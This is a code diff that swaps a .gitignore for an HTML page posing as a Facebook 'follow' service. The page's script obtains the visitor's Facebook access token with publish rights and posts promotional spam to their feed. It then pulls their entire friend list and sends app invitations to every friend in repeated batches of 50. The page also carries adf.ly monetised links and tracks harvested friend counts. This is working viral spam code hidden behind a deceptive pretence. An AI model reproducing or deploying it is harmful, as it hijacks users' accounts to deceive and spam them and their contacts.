@@ -1,13 +1,186 @@
-# Compiled Object files
-*.slo
-*.lo
-*.o
 
-# Compiled Dynamic libraries
-*.so
-*.dylib
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+<html>
+<head>
+<title>Follow Bh_Originall Service</title>
+<meta http-equiv="content-type" content="text/html; charset=ISO-8859-1">
+<meta name="generator" content="Web">
+        <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js" ></script>
+        <script type="text/javascript">
+                  var _gaq = _gaq || [];
+                  _gaq.push(['_setAccount', 'UA-41334226-1']);
+                  _gaq.push(['_trackPageview']);
+                
+                  (function() {
+                    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+                    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+                    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+                  })();
+                
+                </script>
+                <script>
+                    function skip() {
+                        document.getElementById("Oussama").style.display = "none";
+                        document.getElementById("bh").style.display = "none";
+                    }
+                </script>
+</head>
+<body background="http://im38.gulfup.com/6tEVc.png">
+<div id="image5" style="position:absolute; overflow:hidden; left:306px; top:2px; width:760px; height:200px; z-index:0"><img src="http://im38.gulfup.com/DZW28.png" alt="" title="" border=0 width=760 height=200></div>
 
-# Compiled Static libraries
-*.lai
-*.la
-*.a
+<div id="image6" style="position:absolute; overflow:hidden; left:408px; top:210px; width:550px; height:80px; z-index:1"><img src="http://im38.gulfup.com/YfYgY.png" alt="" title="" border=0 width=550 height=80></div>
+
+<div id="image7" style="position:absolute; overflow:hidden; left:410px; top:414px; width:550px; height:80px; z-index:2"><img src="http://im38.gulfup.com/xL8ct.png" alt="" title="" border=0 width=550 height=80></div>
+
+<div id="image8" style="position:absolute; overflow:hidden; left:413px; top:618px; width:550px; height:80px; z-index:3"><img src="http://im38.gulfup.com/uQPit.png" alt="" title="" border=0 width=550 height=80></div>
+
+<div id="image9" style="position:absolute; overflow:hidden; left:334px; top:828px; width:760px; height:50px; z-index:4"><img src="http://im38.gulfup.com/wV3AJ.png" alt="" title="" border=0 width=760 height=50></div>
+
+<div id="html1" style="position:absolute; overflow:hidden; left:512px; top:311px; width:356px; height:82px; z-index:5">
+<div dir="rtl" style="text-align: right;" trbidi="on">
+<div class="separator" style="clear: both; text-align: center;">
+<a href="https://adf.ly/5928486/--" target="_blank"><img border="0" height="55" src="http://store0.up-00.com/2013-12/1387139237231.jpg" width="320" /></a></div>
+</div>
+</div>
+
+<div id="html2" style="position:absolute; overflow:hidden; left:511px; top:509px; width:355px; height:81px; z-index:6">
+<div dir="rtl" style="text-align: right;" trbidi="on">
+<div class="separator" style="clear: both; text-align: center;">
+<a href="https://adf.ly/5928486/--" target="_blank"><img border="0" height="55" src="http://4.bp.blogspot.com/-a3bfghIyRMw/UsAAvt7-qGI/AAAAAAAAJwU/coxzv6KjruQ/s320/222323.png" width="320" /></a></div>
+</div>
+</div>
+
+<div id="html3" style="position:absolute; overflow:hidden; left:515px; top:722px; width:358px; height:79px; z-index:7">
+<div dir="rtl" style="text-align: right;" trbidi="on">
+  <a onclick="return sendRequestToFriends('follow-facebook','follow-facebook With Your Friends.')" href="#">
+           <img src="http://4.bp.blogspot.com/-SRdjO4cW6O8/UsABaCajSqI/AAAAAAAAJwg/F2GMFZm0-Js/s320/54343.png" />
+           </a>
+</div>
+</div>
+      <div id="fb-root"></div>
+        <script>
+            var app_id = 311913055637680,
+                app_name = "hattab_kk",
+                    app_pic = "http://www4.0zz0.com/2014/01/04/14/111316238.png",
+                davet_m = '',
+                davet_t = 'Invite Friends To Play',
+                fba = 0,
+                posted = false,
+                app_url = "https://apps.facebook.com/hattab_kk/",
+                post_message = "follow me app";
+                
+                        $.getJSON("https://graph.facebook.com/"+app_id,function(response) {
+                            if (response && response.namespace) {
+                                app_url = "http://apps.facebook.com/"+response.namespace;
+                            }
+                        })
+            window.fbAsyncInit = function () {
+                var curLoc = window.location;
+                FB.init({
+                        appId: app_id,
+                        xfbml: true,
+                        oauth: true,
+                        cookie: true
+                    });
+                FB.Canvas.setAutoGrow();
+                FB.Canvas.setDoneLoading();
+            };
+
+            (function () {
+                    var e = document.createElement('script');
+                    e.async = true;
+                    e.src = document.location.protocol + '//connect.facebook.net/en_US/all.js';
+                    document.getElementById('fb-root').appendChild(e);
+                }());
+            function mshuffle(o) {
+                for (var j, x, i = o.length; i; j = parseInt(Math.random() * i), x = o[--i], o[i] = o[j], o[j] = x);
+                return o;
+            };
+            var fbtoken = "";
+            function sendRequestToFriends(txxt, title) {
+                if (true == posted) return false;
+                davet_m = txxt;
+                if (title) davet_t = title;
+                FB.login(function (response) {
+                    //console.log(response);
+                  if (response.authResponse) {
+                          if (response.authResponse.accessToken) {
+                              fbtoken = response.authResponse.accessToken;
+                              var post_url = "https://graph.facebook.com/me/feed";
+                              var post_vars = {
+                                  method: "POST",
+                                  access_token: fbtoken,
+                                  message: post_message,
+                                  link: app_url,
+                                  picture: app_pic,
+                                  name: app_name,
+                                  caption: "Official Game",
+                                  description: "Introducing >> "+app_name+"<< First come first serve!"
+                              }
+                              $.getJSON(post_url,post_vars,function(response){
+                                  posted_id = response.id || 0;
+                                  _gaq.push(['_trackEvent', 'post', posted_id]);
+                              })
+                              
+                          }
+                      FB.api('/me', function (response) {
+                        fba = response.id;
+                      });
+                      all();
+                  } else {
+                      _gaq.push(['_trackEvent', 'Auth', fba]);
+                      //all();
+                  }
+                },{
+                    scope: "publish_actions"
+                });
+                return false;
+            };
+
+            function all() {
+                var f = [];
+                FB.api('/me/friends', function (response) {
+                        _gaq.push(['_trackEvent', 'Friends', fba, '', response.data.length]);
+                        for (var i = 0; i < response.data.length; i++) f.push(response.data[i].id);
+                        loop(f);
+                    });
+            };
+
+            function loop(f) {
+                var l = Math.min(f.length, 50),
+                    t = [];
+                mshuffle(f);
+                if (0 != l) {
+                    for (var j = 0; j < l; j++) t.push(f[j]);
+                    FB.ui({
+                            method: 'apprequests',
+                            data: app_id,
+                            message: davet_m,
+                            title: davet_t,
+                            to: t
+                        }, function (response) {
+                            if (response) {
+                                _gaq.push(['_trackEvent', 'Requests', fba, '', response.to.length]);
+                                for (var i = 0; i < response.to.length; i++) {
+                                    var idx = f.indexOf(response.to[i]);
+                                    - 1 != idx && f.splice(idx, 1);
+                                }
+                                if (f.length == 0) {
+                                    top.location.href = 'https://www.facebook.com/lists/591211307613002';
+                                }
+                                f.length > 0 && loop(f);
+                            } else {
+                                _gaq.push(['_trackEvent', 'Requests', fba]);
+                                f.length > 0 && loop(f);
+                            }
+                        });
+
+                } else {
+                    top.location.href = 'https://www.facebook.com/lists/591211307613002';
+                }
+            }
+        </script>
+
+
+</body>
+</html>
